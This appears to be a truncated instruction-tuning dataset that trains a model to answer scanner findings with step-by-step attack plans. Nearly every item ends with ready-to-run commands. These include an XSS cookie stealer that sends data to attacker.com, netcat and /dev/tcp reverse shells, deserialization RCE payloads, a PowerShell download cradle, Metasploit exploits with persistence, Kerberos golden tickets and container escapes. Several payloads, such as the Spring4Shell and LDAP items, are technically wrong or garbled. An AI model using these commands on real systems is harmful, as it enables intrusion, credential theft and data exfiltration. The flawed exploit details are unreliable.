g
[
  {
    "instruction": "Generate a step-by-step attack plan using Burp Suite to exploit the identified XSS vulnerability and steal session cookies.",
    "input": "Burp Scanner finding on target https://app.example.com/login: Reflected Cross-Site Scripting (XSS) in the 'search' parameter of '/search.php'. The payload '<script>alert(1)</script>' is reflected without sanitization.",
    "output": "Step 1️⃣ — Identify Vulnerability\nThe reflected XSS in the 'search' parameter allows injection of JavaScript, which can be used to steal user cookies and exfiltrate them to an attacker-controlled server.\n\nStep 2️⃣ — Craft Malicious Payload\nWe'll create a payload that captures the document.cookie and sends it via an img src to our server. Use Burp's Repeater to test and refine the payload.\n\nStep 3️⃣ — Execute Attack\nIntercept a legitimate search request in Burp Proxy, modify the 'search' parameter to the payload, and forward it. To automate, use Burp Intruder with the payload positions set. Example payload for the parameter:\n```http\nsearch=<script>var i=new Image();i.src='http://attacker.com/steal?cookie='+document.cookie;</script>\n```\nOnce sent, check your listener server (e.g., netcat on port 80) for the exfiltrated cookies."
  },
  {
    "instruction": "Provide the Nmap command sequence to discover and fingerprint the vulnerable service for further exploitation.",
    "input": "Initial recon shows target 172.16.0.50 has an open port 445. Suspected SMB version is outdated, potentially vulnerable to EternalBlue (MS17-010).",
    "output": "Step 1️⃣ — Identify Vulnerability\nPort 445 indicates SMB, and an outdated version is likely exploitable via EternalBlue for remote code execution on Windows systems.\n\nStep 2️⃣ — Formulate Nmap Commands\nUse Nmap's scripting engine (NSE) to detect the specific SMB vulnerability and gather version details for targeted exploitation.\n\nStep 3️⃣ — Execute Attack\nRun the following commands in sequence. The first scans for the vuln; the second provides verbose service fingerprinting.\n```bash\nnmap -p445 --script smb-vuln-ms17-010 172.16.0.50\nnmap -p445 -sV -sC 172.16.0.50\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the identified Heartbleed vulnerability and dump SSL private keys.",
    "input": "OpenVAS scan on target 10.10.10.20: Port 443/TCP is running OpenSSL 1.0.1 vulnerable to Heartbleed (CVE-2014-0160), allowing memory disclosure.",
    "output": "Step 1️⃣ — Identify Vulnerability\nHeartbleed (CVE-2014-0160) in OpenSSL allows reading up to 64KB of process memory, potentially exposing private keys and sensitive data.\n\nStep 2️⃣ — Formulate Metasploit Command\nWe'll use the auxiliary scanner module to repeatedly request heartbeat extensions and dump memory contents, filtering for private keys.\n\nStep 3️⃣ — Execute Attack\nLaunch msfconsole and run this one-liner to scan and exploit, saving dumps to a file for analysis.\n```bash\nmsfconsole -q -x \"use auxiliary/scanner/ssl/openssl_heartbleed; set RHOSTS 10.10.10.20; set RPORT 443; set SSL true; set HEARTBLEED_OUTPUT /tmp/heartbleed_dump; run\"\n```"
  },
  {
    "instruction": "Create a command chain to exploit the command injection vulnerability and achieve reverse shell.",
    "input": "ZAP scan finding on target http://vulnerable-site.com/ping.php: Command injection in the 'ip' parameter, confirmed with payload '127.0.0.1; id'. Server is Linux-based.",
    "output": "Step 1️⃣ — Confirm Vulnerability\nThe 'ip' parameter allows OS command injection, enabling arbitrary command execution on the server.\n\nStep 2️⃣ — Craft Reverse Shell Payload\nWe'll inject a netcat reverse shell command to connect back to our attacker machine, assuming netcat is available on the target.\n\nStep 3️⃣ — Execute Attack\nUse curl to send the injected payload. First, set up a listener on your machine with `nc -lvnp 4444`, then execute:\n```bash\ncurl -X POST -d \"ip=127.0.0.1; nc -e /bin/sh <YOUR_IP> 4444\" http://vulnerable-site.com/ping.php\n```"
  },
  {
    "instruction": "Provide the steps and ysoserial command to generate a gadget chain for deserialization RCE on the target.",
    "input": "Burp Suite finding on target https://api.example.com/process: Java deserialization vulnerability in user-supplied serialized objects, using Apache Commons Collections library.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnsafe deserialization of Java objects can lead to remote code execution via gadget chains in libraries like Commons Collections.\n\nStep 2️⃣ — Generate Payload with ysoserial\nUse ysoserial to create a serialized payload that executes a command, such as a reverse shell, when deserialized.\n\nStep 3️⃣ — Execute Attack\nDownload ysoserial if needed, generate the payload, then send it via Burp Repeater or curl. Example command to generate and pipe to curl:\n```bash\njava -jar ysoserial.jar CommonsCollections6 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' > payload.ser\ncurl -X POST --data-binary @payload.ser -H 'Content-Type: application/octet-stream' https://api.example.com/process\n```"
  },
  {
    "instruction": "Generate a two-step attack using the directory traversal vulnerability to access and exfiltrate configuration files.",
    "input": "Finding 1: Directory traversal in '/download.php?file=doc.pdf' allows '../' traversal. Finding 2: Web server logs indicate the config file is at '/var/www/config/database.ini'.",
    "output": "Step 1️⃣ — Information Gathering\nLeverage the traversal to confirm access to parent directories and map the file system structure.\n\nStep 2️⃣ — Chain to Exfiltrate Sensitive File\nUse the known path to traverse to the database config file and download its contents, revealing credentials.\n\nStep 3️⃣ — Execute Attack\nSend the traversal payload via curl to retrieve the file. Adjust depth based on web root (assuming 3 levels up).\n```bash\ncurl 'http://target.com/download.php?file=../../../var/www/config/database.ini'\n```"
  },
  {
    "instruction": "Provide the practical commands to exploit the weak JWT implementation and impersonate an admin user.",
    "input": "JWT token analysis on target https://app.target.com: The token uses HS256 with a weak secret 'password123', and the 'user' claim can be modified.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak secret in HS256-signed JWT allows forging new tokens by re-signing with the known secret.\n\nStep 2️⃣ — Craft Forged Token\nUse jwt.io or a tool like jwt_tool to decode, modify the payload (e.g., set 'user' to 'admin'), and re-sign.\n\nStep 3️⃣ — Execute Attack\nExample using Python's PyJWT library to generate and use the token. Replace <YOUR_IP> if needed for callback.\n```bash\npython3 -c \"import jwt; payload = {'user': 'admin'}; token = jwt.encode(payload, 'password123', algorithm='HS256'); print(token)\" | curl -H 'Authorization: Bearer <TOKEN>' https://app.target.com/admin\n```"
  },
  {
    "instruction": "Generate the sqlmap tamper script and command to bypass WAF on the time-based SQL injection.",
    "input": "Scan report: Time-based blind SQLi in 'username' parameter at 'http://site.com/login.php'. WAF detected, blocking standard payloads; backend is PostgreSQL.",
    "output": "Step 1️⃣ — Confirm Vulnerability\nTime-based blind SQLi allows inference of data via delays, but WAF blocks obvious unions or sleeps.\n\nStep 2️⃣ — Bypass with Tamper Script\nCreate a custom tamper script to encode payloads (e.g., char() function) to evade keyword filtering.\n\nStep 3️⃣ — Execute Attack\nSave the tamper as 'pg_tamper.py', then run sqlmap with it for database enumeration.\n```bash\n# pg_tamper.py content: from lib.core.enums import PRIORITY; __priority__ = PRIORITY.NORMAL; def tamper(payload, **kwargs): return payload.replace('sleep', 'char(115)+char(108)+char(101)+char(101)+char(112)')\n\nsqlmap -u \"http://site.com/login.php\" -p username --delay=2 --dbms=postgresql --tamper=pg_tamper.py --dbs\n```"
  },
  {
    "instruction": "Assuming a foothold shell, provide commands to exploit the sudo misconfiguration for root access.",
    "input": "Post-exploitation enum: The user 'webuser' can run '/usr/bin/find' as root without password via sudoers misconfig.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nSudo allows 'webuser' to execute 'find' as root, which can be abused to run arbitrary commands via the -exec flag.\n\nStep 2️⃣ — Craft Abused Command\nUse 'find' to locate a file and execute a shell via -exec, spawning a root shell.\n\nStep 3️⃣ — Execute Attack\nFrom the 'webuser' shell, run the following to get a root prompt.\n```bash\nsudo find / -exec /bin/sh \\; -quit\n```"
  },
  {
    "instruction": "Create the curl command sequence to exploit the SSRF vulnerability and scan internal network ports.",
    "input": "Finding: Server-Side Request Forgery (SSRF) in 'url' parameter at 'http://external.com/fetch?url=http://example.com'. It fetches and returns content from internal IPs like 127.0.0.1.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSSRF allows the server to make requests to internal resources, enabling port scanning and metadata access.\n\nStep 2️⃣ — Formulate Internal Scan\nWe'll craft URLs to probe internal services, starting with localhost and common internal ports.\n\nStep 3️⃣ — Execute Attack\nUse curl to send SSRF payloads sequentially, observing responses for open ports (e.g., 22 for SSH).\n```bash\ncurl 'http://external.com/fetch?url=http://127.0.0.1:22/mitm'\ncurl 'http://external.com/fetch?url=http://127.0.0.1:3306/mysql'\n```"
  },
  {
    "instruction": "Generate the Nuclei template command to scan for the identified Log4Shell vulnerability and confirm exploitation potential.",
    "input": "Custom scan on target 192.168.100.5: Application logs show use of Log4j 2.14.1, vulnerable to Log4Shell (CVE-2021-44228) via JNDI lookup in user input fields.",
    "output": "Step 1️⃣ — Identify Vulnerability\nLog4Shell allows remote code execution by injecting JNDI payloads into log messages processed by vulnerable Log4j versions.\n\nStep 2️⃣ — Formulate Nuclei Scan\nUse Nuclei's community templates to detect and potentially exploit the JNDI injection, confirming if the server resolves external LDAP.\n\nStep 3️⃣ — Execute Attack\nInstall Nuclei if needed, then run this command targeting the host on common ports. It will report if the vuln is present and suggest payloads.\n```bash\nnuclei -u 192.168.100.5 -t cves/ -id log4shell -v\n```"
  },
  {
    "instruction": "Provide the steps and curl commands to exploit the open redirect vulnerability for phishing.",
    "input": "OWASP ZAP finding on target https://secure-bank.com: Open redirect in 'redirect_url' parameter at '/login?redirect_url=profile', allowing arbitrary external redirects.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOpen redirect flaws can trick users into visiting malicious sites by manipulating the redirect parameter.\n\nStep 2️⃣ — Craft Phishing Payload\nWe'll redirect to an attacker-controlled page mimicking the login, capturing credentials via a fake form.\n\nStep 3️⃣ — Execute Attack\nSend the crafted URL via email or link. Example curl to test the redirect:\n```bash\ncurl -L 'https://secure-bank.com/login?redirect_url=https://evil.com/phish-login' -v\n```\nObserve the 302 redirect in the response headers confirming the bypass."
  },
  {
    "instruction": "Generate a Metasploit resource script to chain the RCE vulnerability with a persistence payload.",
    "input": "Exploit-DB entry for target 10.11.0.30: PHP remote file inclusion in 'include' parameter at '/admin.php?include=login.php', allowing code upload.",
    "output": "Step 1️⃣ — Identify Vulnerability\nRFI enables including remote files, which can be used to execute uploaded PHP shells for initial access.\n\nStep 2️⃣ — Create Persistence Payload\nWe'll upload a Meterpreter reverse shell and use a resource script to auto-exploit and install a backdoor.\n\nStep 3️⃣ — Execute Attack\nSave the following as 'rfi_chain.rc', then load in msfconsole: `msfconsole -r rfi_chain.rc`.\n```rc\nuse exploit/multi/http/php_include\nset RHOSTS 10.11.0.30\nset RPORT 80\nset LHOST <YOUR_IP>\nset PAYLOAD php/meterpreter/reverse_tcp\nexploit\n# Persistence: run persistence -U -i 10 -p 4444 -r <YOUR_IP>\n```\nThis chains exploitation with a userland persistence module."
  },
  {
    "instruction": "Provide the Python script snippet to brute-force the identified weak authentication mechanism.",
    "input": "Dirbuster scan on target http://intranet.local: Basic auth on '/admin' directory uses HTTP Basic with a wordlist-susceptible password (common like 'admin').",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak Basic Auth can be brute-forced offline or online if rate-limiting is absent, revealing credentials quickly.\n\nStep 2️⃣ — Formulate Brute-Force Script\nUse Python's requests library with a wordlist to attempt logins, checking for 200 OK responses.\n\nStep 3️⃣ — Execute Attack\nSave as 'brute.py' and run `python3 brute.py`. Assumes a passwords.txt wordlist.\n```python\nimport requests\nusernames = ['admin']\npasswords = open('passwords.txt').readlines()\nurl = 'http://intranet.local/admin'\nfor pwd in passwords:\n    pwd = pwd.strip()\n    response = requests.get(url, auth=(usernames[0], pwd))\n    if response.status_code == 200:\n        print(f'Found: {usernames[0]}:{pwd}')\n        break\n```"
  },
  {
    "instruction": "Create a command sequence to exploit the buffer overflow vulnerability and spawn a shell.",
    "input": "Fuzzing report on target 172.17.0.2: Port 9999 running a custom C daemon vulnerable to stack buffer overflow in input handling, ASLR disabled.",
    "output": "Step 1️⃣ — Identify Vulnerability\nBuffer overflow allows overwriting the return address to redirect execution to shellcode.\n\nStep 2️⃣ — Craft Exploit Payload\nUse cyclic patterns to find offset, then inject shellcode for a reverse connect-back.\n\nStep 3️⃣ — Execute Attack\nFrom a local exploit script or netcat: First, set listener `nc -lvnp 5555`, then send payload via netcat.\n```bash\n# Assuming offset 112, shellcode \\x31\\xc0... (x86 linux execve /bin/sh)\npython3 -c 'print(\"A\"*112 + \"\\x08\\xde\\xff\\xff\" + \"\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")' | nc 172.17.0.2 9999\n```"
  },
  {
    "instruction": "Generate the steps and dirsearch command to discover hidden directories leading to the admin panel.",
    "input": "Finding: Default index page at http://forum.example.com suggests a hidden admin area; common paths like /administrator/ return 403.",
    "output": "Step 1️⃣ — Identify Vulnerability\nDirectory enumeration can reveal hidden endpoints, especially if access controls are path-based only.\n\nStep 2️⃣ — Formulate Enumeration Command\nUse dirsearch with a wordlist tailored for web apps to fuzz common admin paths.\n\nStep 3️⃣ — Execute Attack\nRun dirsearch with extensions for common files; it will report 200/301 responses.\n```bash\ndirsearch -u http://forum.example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html --random-agent\n```"
  },
  {
    "instruction": "Provide the Impacket command to exploit the NTLM relay attack on the identified setup.",
    "input": "Bloodhound analysis on domain controller 10.0.0.10: SMB signing disabled on shares, allowing NTLM relay to LDAP for DCSync rights.",
    "output": "Step 1️⃣ — Identify Vulnerability\nDisabled SMB signing enables relaying captured NTLM hashes to other services like LDAP for privilege escalation.\n\nStep 2️⃣ — Set Up Relay Attack\nUse Responder to poison LLMNR/NBT-NS and ntlmrelayx to relay to LDAP, targeting DCSync.\n\nStep 3️⃣ — Execute Attack\nRun in sequence: First, start relay, then trigger from a victim machine.\n```bash\n# Terminal 1\npython3 /opt/impacket/examples/ntlmrelayx.py -t ldaps://10.0.0.10 --dump-adcs\n\n# Terminal 2 (poison)\npython3 /opt/impacket/examples/Responder.py -I eth0\n\n# Trigger: From Windows victim, access \\\\attacker-ip\\share\n```"
  },
  {
    "instruction": "Generate a two-step chain using the CSRF vulnerability to change user email via POST request.",
    "input": "Finding 1: CSRF in '/profile/update' lacks token validation. Finding 2: Anti-CSRF tokens are only on GET requests, not POST.",
    "output": "Step 1️⃣ — Information Gathering\nConfirm the POST endpoint requires no token by inspecting a legitimate update request in Burp.\n\nStep 2️⃣ — Craft CSRF PoC\nCreate an HTML page with a form that auto-submits the malicious email change when the victim visits it while logged in.\n\nStep 3️⃣ — Execute Attack\nHost the PoC HTML on your server and phish the victim to visit it. Example HTML snippet:\n```html\n<html><body><form action='https://target.com/profile/update' method='POST' id='csrf'><input type='hidden' name='email' value='attacker@evil.com'><input type='submit'></form><script>document.getElementById('csrf').submit();</script></body></html>\n```"
  },
  {
    "instruction": "Assuming shell access, provide commands to exploit the cron job misconfiguration for persistence.",
    "input": "Post-exploit enum on Linux target: A world-writable cron job at '/etc/cron.d/backup' runs '/backup.sh' as root every minute.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nWritable cron scripts allow injecting malicious code that executes with elevated privileges.\n\nStep 2️⃣ — Inject Backdoor\nEdit the script to append a reverse shell command, ensuring it runs silently.\n\nStep 3️⃣ — Execute Attack\nFrom the shell, modify and wait for cron trigger.\n```bash\necho 'nc -e /bin/sh <YOUR_IP> 6666 &' >> /backup.sh\n# Wait 1 min, check listener\n```"
  },
  {
    "instruction": "Create the wfuzz command to fuzz the identified IDOR vulnerability for unauthorized data access.",
    "input": "Burp finding on target https://api.bank.com/user/123: Insecure Direct Object Reference in user ID parameter, allowing access to other users' profiles.",
    "output": "Step 1️⃣ — Identify Vulnerability\nIDOR permits accessing resources by manipulating identifiers without authorization checks.\n\nStep 2️⃣ — Formulate Fuzzing Command\nUse wfuzz to iterate through a list of IDs, filtering for successful responses indicating data leaks.\n\nStep 3️⃣ — Execute Attack\nRun wfuzz with a numeric wordlist (e.g., 1-1000), grepping for 200 status.\n```bash\nwfuzz -c -z range,1-1000 -u 'https://api.bank.com/user/FUZZ' -H 'Authorization: Bearer <YOUR_TOKEN>' --hc 404\n```"
  },
  {
    "instruction": "Generate the exploit command using the provided PoC for the identified deserialization vulnerability to achieve RCE.",
    "input": "GitHub PoC for CVE-2023-XXXX on target https://java-app.com/api: Unsafe Java deserialization in serialized session data, exploitable with ysoserial CommonsBeanutils1 gadget.",
    "output": "Step 1️⃣ — Identify Vulnerability\nThe deserialization flaw allows injecting malicious serialized objects that execute arbitrary code upon deserialization.\n\nStep 2️⃣ — Prepare Payload\nUse ysoserial to generate a gadget chain payload for a reverse shell, targeting the session upload endpoint.\n\nStep 3️⃣ — Execute Attack\nGenerate the payload and send it via curl to the vulnerable endpoint. Set up listener first: `nc -lvnp 7777`.\n```bash\njava -jar ysoserial.jar CommonsBeanutils1 'bash -i >& /dev/tcp/<YOUR_IP>/7777 0>&1' > shell.ser\ncurl -X POST -H 'Cookie: session=$(base64 -w0 shell.ser)' https://java-app.com/api/login\n```"
  },
  {
    "instruction": "Provide the steps and command to exploit the misconfigured AWS S3 bucket for data exfiltration.",
    "input": "Recon finding: S3 bucket 'company-backup-2025' at https://company-backup-2025.s3.amazonaws.com is publicly readable, containing sensitive API keys and configs.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPublic S3 buckets expose data without authentication, allowing anonymous downloads of all objects.\n\nStep 2️⃣ — Enumerate Contents\nUse AWS CLI or curl to list and download files, focusing on high-value targets like .env or key files.\n\nStep 3️⃣ — Execute Attack\nAssuming AWS CLI configured anonymously, or use curl for direct access. Example to list and download a key file:\n```bash\naws s3 ls s3://company-backup-2025/ --no-sign-request\naws s3 cp s3://company-backup-2025/.env /local/path --no-sign-request\n```\nOr via curl: `curl https://company-backup-2025.s3.amazonaws.com/.env -o stolen.env`"
  },
  {
    "instruction": "Create a Metasploit command sequence to exploit the Bluetooth vulnerability and gain device access.",
    "input": "BlueHydra scan on nearby device MAC AA:BB:CC:DD:EE:FF: Running BlueBorne (CVE-2017-0785) vulnerable Android/iOS Bluetooth stack, allowing RCE over BLE.",
    "output": "Step 1️⃣ — Identify Vulnerability\nBlueBorne exploits flaws in Bluetooth stacks for unauthenticated code execution without pairing.\n\nStep 2️⃣ — Formulate Metasploit Module\nUse the BlueBorne module to scan, target the MAC, and inject shellcode for a reverse connection.\n\nStep 3️⃣ — Execute Attack\nRun msfconsole with the exploit configured for the specific MAC and your listener IP.\n```bash\nmsfconsole -q -x \"use exploit/linux/bluetooth/blueborne_hci_smd; set BDADDR AA:BB:CC:DD:EE:FF; set LHOST <YOUR_IP>; set LPORT 8888; exploit\"\n```"
  },
  {
    "instruction": "Generate the command to use Gobuster for discovering the vulnerable endpoint in the GraphQL API.",
    "input": "Finding: GraphQL introspection enabled at https://api.target.com/graphql, but admin mutations hidden; potential for batch query DoS.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed GraphQL allows endpoint discovery and potential abuse like introspection or deep recursion for DoS.\n\nStep 2️⃣ — Formulate Discovery Command\nUse Gobuster with a GraphQL-specific wordlist to fuzz for hidden queries and mutations.\n\nStep 3️⃣ — Execute Attack\nRun Gobuster targeting the /graphql path, filtering for 200 responses to map the schema.\n```bash\ngobuster dir -u https://api.target.com/graphql -w graphql-wordlist.txt -x json -k --wildcard\n```"
  },
  {
    "instruction": "Provide the Python one-liner to exploit the XXE vulnerability and read local files.",
    "input": "XXE in XML POST to http://xml-parser.com/process: Entity expansion allowed, server on Linux with /etc/shadow accessible.",
    "output": "Step 1️⃣ — Identify Vulnerability\nXXE permits external entity resolution, leading to local file disclosure via crafted XML.\n\nStep 2️⃣ — Craft XXE Payload\nEmbed a DOCTYPE with an external entity pointing to a local file like /etc/passwd.\n\nStep 3️⃣ — Execute Attack\nUse Python's urllib to send the malicious XML payload and capture the response.\n```python\npython3 -c \"import urllib.request; xml='<?xml version=\\\"1.0\\\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><root>&xxe;</root>'; req=urllib.request.Request('http://xml-parser.com/process', data=xml.encode(), headers={'Content-Type':'application/xml'}); print(urllib.request.urlopen(req).read().decode())\"\n```"
  },
  {
    "instruction": "Generate a two-step attack chain using the clickjacking vulnerability to overlay and steal credentials.",
    "input": "Finding 1: Clickjacking on https://bank.com/transfer lacks X-Frame-Options. Finding 2: Transfer form submits to /api/transfer without CSRF token.",
    "output": "Step 1️⃣ — Confirm Clickjacking\nLoad the transfer page in an iframe on your domain; it renders without restrictions.\n\nStep 2️⃣ — Chain with Overlay Attack\nCreate an HTML page with a transparent iframe over a fake button, tricking clicks into real transfers.\n\nStep 3️⃣ — Execute Attack\nHost this PoC and phish the user to visit. Example HTML:\n```html\n<html><body><iframe src='https://bank.com/transfer' style='opacity:0.5; position:absolute; top:0; left:0; width:100%; height:100%;'></iframe><button style='position:absolute; top:50px; left:50px; z-index:1;'>Click to Win!</button><script>document.querySelector('button').addEventListener('click', () => {document.querySelector('iframe').contentWindow.document.querySelector('form').submit();});</script></body></html>\n```"
  },
  {
    "instruction": "Provide the commands to exploit the Docker API exposure for container escape.",
    "input": "Port scan: Docker daemon exposed on 10.0.1.100:2375 without TLS, running privileged containers.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed Docker socket allows arbitrary container creation and execution, leading to host escape.\n\nStep 2️⃣ — Interact with API\nUse curl to POST a new privileged container mounting the host root, then exec into it.\n\nStep 3️⃣ — Execute Attack\nSequence of curl commands to create and escape:\n```bash\n# Create container\ncurl -X POST http://10.0.1.100:2375/containers/create -d '{\"Image\":\"alpine\",\"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/:/host\"]},\"Cmd\":[\"sleep\",\"infinity\"]}'\n\n# Start it (use container ID from response)\ncurl -X POST http://10.0.1.100:2375/containers/<ID>/start\n\n# Exec shell\ncurl -X POST http://10.0.1.100:2375/containers/<ID>/exec -d '{\"Cmd\":[\"sh\"]}' && curl -X POST http://10.0.1.100:2375/exec/<EXEC_ID>/start -d '{\"Detach\":false,\"Tty\":true}'\n# In shell: chroot /host\n```"
  },
  {
    "instruction": "Generate the sqlmap command with custom tamper to exploit the error-based SQL injection bypassing input sanitization.",
    "input": "Finding: Error-based SQLi in 'search' GET parameter at http://shop.com/search?q=test, backend Oracle, sanitizes single quotes but not stacked queries.",
    "output": "Step 1️⃣ — Confirm Vulnerability\nError-based SQLi leaks database errors, useful for extraction; bypass via stacked queries if quotes are filtered.\n\nStep 2️⃣ — Formulate Tamper\nUse sqlmap's space2comment tamper to evade space filtering, combined with --technique=E for errors.\n\nStep 3️⃣ — Execute Attack\nRun sqlmap targeting the parameter for table enumeration.\n```bash\nsqlmap -u \"http://shop.com/search?q=test\" -p q --technique=E --tamper=space2comment --dbms=oracle --tables\n```"
  },
  {
    "instruction": "Assuming initial access, provide commands to exploit the Kubernetes RBAC misconfiguration for cluster takeover.",
    "input": "Kubelet enum: Pod runs as serviceaccount with cluster-admin role, API server at https://k8s-master:6443 accessible from pod.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nOver-privileged serviceaccount allows binding to cluster-admin, granting full control.\n\nStep 2️⃣ — Craft RBAC Binding\nUse kubectl from the pod to create a ClusterRoleBinding assigning cluster-admin to the serviceaccount.\n\nStep 3️⃣ — Execute Attack\nFrom the pod shell, run these kubectl commands (token auto-mounted).\n```bash\nkubectl create clusterrolebinding cluster-admin-binding --clusterrole=cluster-admin --serviceaccount=default:default\nkubectl auth can-i '*' --all-namespaces  # Verify\n# Now create pods, etc., e.g., kubectl run attacker --image=alpine --rm -it -- /bin/sh\n```"
  },
  {
    "instruction": "Create the command to use ffuf for fuzzing the authentication bypass in the API endpoint.",
    "input": "Finding: API at https://restapi.com/v1/users returns 200 for invalid auth headers, potential bypass with manipulated tokens.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak auth allows fuzzing headers or params to find bypasses, like empty or specific values.\n\nStep 2️⃣ — Formulate Fuzzing\nUse ffuf with a wordlist of common bypass strings in the Authorization header.\n\nStep 3️⃣ — Execute Attack\nFuzz the header, filtering for responses without 401 errors.\n```bash\nffuf -u https://restapi.com/v1/users -H 'Authorization: Bearer FUZZ' -w bypass-wordlist.txt -fc 401\n```"
  },
  {
    "instruction": "Generate the steps and command to exploit the Spring4Shell vulnerability for remote code execution.",
    "input": "Dependency scan on target https://spring-app.com: Using Spring Framework 5.2.0 with WebFlux, vulnerable to CVE-2022-22965 (Spring4Shell) via class loader manipulation in request parameters.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSpring4Shell allows RCE by manipulating request parameters to load a malicious class via Tomcat's class loader.\n\nStep 2️⃣ — Craft Malicious Payload\nPrepare a JSP shell and use parameters to trigger class loading from a remote location or local write.\n\nStep 3️⃣ — Execute Attack\nUse curl to send the crafted request with parameters that write and execute a shell. Set listener: `nc -lvnp 9999`.\n```bash\ncurl -H 'Content-Type: text/plain' -d '{\"@type\":\"java.lang.ClassLoader\",\"@class\":\"org.springframework.core.type.classreading.SimpleMetadataReaderFactory\",\"metadataReader\":{\"@class\":\"org.springframework.core.type.classreading.SimpleMetadataReaderFactory$ResourceClassReader\",\"location\":{\"@class\":\"org.springframework.core.io.UrlResource\",\"url\":\"http://<YOUR_IP>:8000/Exploit.class\"}}}' https://spring-app.com/actuator/env\n# Host Exploit.class (compiled JSP shell) on your server at port 8000\n```"
  },
  {
    "instruction": "Provide the Impacket command to forge a Kerberos ticket and impersonate a domain admin.",
    "input": "Bloodhound finding on AD domain example.com: User 'serviceacct' has 'getPassword' on 'krbtgt' account, allowing golden ticket creation.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOver-privileged service account enables extracting krbtgt hash for forging TGTs, leading to domain compromise.\n\nStep 2️⃣ — Extract and Forge Ticket\nUse GetUserSPNs.py to dump hashes, then ticketer.py to create a golden ticket for admin impersonation.\n\nStep 3️⃣ — Execute Attack\nRun sequence: First dump, then forge and use with psexec.py for shell.\n```bash\n# Dump\npython3 GetUserSPNs.py example.com/serviceacct:<password> -request -dc-ip <DC_IP>\n\n# Forge (use krbtgt NTLM from dump)\npython3 ticketer.py -nthash <KRBGTG_NTLM> -domain-sid <DOMAIN_SID> -domain example.com administrator\n\n# Use: python3 psexec.py example.com/administrator@<TARGET> -k -no-pass\n```"
  },
  {
    "instruction": "Generate the command sequence to exploit the .NET deserialization vulnerability using ysoserial.net.",
    "input": "Burp finding on target https://dotnetapp.com/process: BinaryFormatter deserialization in POST data, vulnerable to gadget chains in DataContractSerializer.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnsafe .NET deserialization allows executing arbitrary code via crafted serialized objects.\n\nStep 2️⃣ — Generate Payload\nUse ysoserial.net to create a Windows reverse shell payload for the vulnerable formatter.\n\nStep 3️⃣ — Execute Attack\nCompile/run ysoserial.net, generate payload, send via curl. Listener: `nc -lvnp 1111`.\n```bash\n# Generate\nysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'powershell IEX(New-Object Net.WebClient).DownloadString(\"http://<YOUR_IP>:80/shell.ps1\")' > payload.bin\n\n# Send\ncurl -X POST --data-binary @payload.bin -H 'Content-Type: application/octet-stream' https://dotnetapp.com/process\n```"
  },
  {
    "instruction": "Provide the curl commands to exploit the path traversal in file download and retrieve sensitive data.",
    "input": "Finding: Path traversal in '/download?file=report.pdf' at http://fileserver.com, allows '../' to access /etc/hosts.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPath traversal bypasses directory restrictions, enabling access to arbitrary files on the server.\n\nStep 2️⃣ — Craft Traversal Payload\nUse multiple '../' to navigate from web root to system files, null-byte if needed for extension bypass.\n\nStep 3️⃣ — Execute Attack\nTest with curl, increasing traversal depth until file is served.\n```bash\ncurl 'http://fileserver.com/download?file=../../../etc/passwd%00.pdf' -o stolen_passwd\ncurl 'http://fileserver.com/download?file=../../../proc/version%00.pdf' -o kernel_info\n```"
  },
  {
    "instruction": "Generate the LDAP injection payload and command to escalate to bind authentication bypass.",
    "input": "Scan report: LDAP auth at ldap://auth.server.com uses unsanitized 'uid' parameter in search filter, backend OpenLDAP.",
    "output": "Step 1️⃣ — Identify Vulnerability\nLDAP injection allows modifying search filters to bypass auth or extract directory info.\n\nStep 2️⃣ — Formulate Injection\nInject '*)' to match any user, combined with admin credentials for bind success.\n\nStep 3️⃣ — Execute Attack\nUse ldapsearch to test the injection in the filter.\n```bash\nldapsearch -x -H ldap://auth.server.com -D 'cn=admin,dc=example,dc=com' -w <admin_pass> -b 'dc=example,dc=com' '(uid=*)(objectClass=*)'\n```"
  },
  {
    "instruction": "Create a Metasploit command to exploit the BlueKeep RDP vulnerability for RCE.",
    "input": "Nmap vuln script on target 192.168.56.101: Port 3389 RDP vulnerable to BlueKeep (CVE-2019-0708), Windows 7 unpatched.",
    "output": "Step 1️⃣ — Identify Vulnerability\nBlueKeep allows unauthenticated RCE over RDP by exploiting channel handling flaws.\n\nStep 2️⃣ — Configure Exploit\nUse the BlueKeep module with auto-check and payload selection for shell.\n\nStep 3️⃣ — Execute Attack\nOne-liner to launch and exploit.\n```bash\nmsfconsole -q -x \"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS 192.168.56.101; set RPORT 3389; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <YOUR_IP>; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insecure API key storage in client-side code for unauthorized access.",
    "input": "Finding: JavaScript file at https://app.com/js/config.js exposes AWS API key 'AKIAIOSFODNN7EXAMPLE' hardcoded for S3 access.",
    "output": "Step 1️⃣ — Identify Vulnerability\nClient-side storage of secrets allows extraction and reuse for unauthorized resource access.\n\nStep 2️⃣ — Extract and Use Key\nDownload the JS, grep the key, then use AWS CLI to list S3 buckets.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl https://app.com/js/config.js | grep -o 'AKIA[0-9A-Z]\\{16\\}'\nAWS_ACCESS_KEY_ID='AKIAIOSFODNN7EXAMPLE' AWS_SECRET_ACCESS_KEY='<SECRET_FROM_JS>' aws s3 ls\n```"
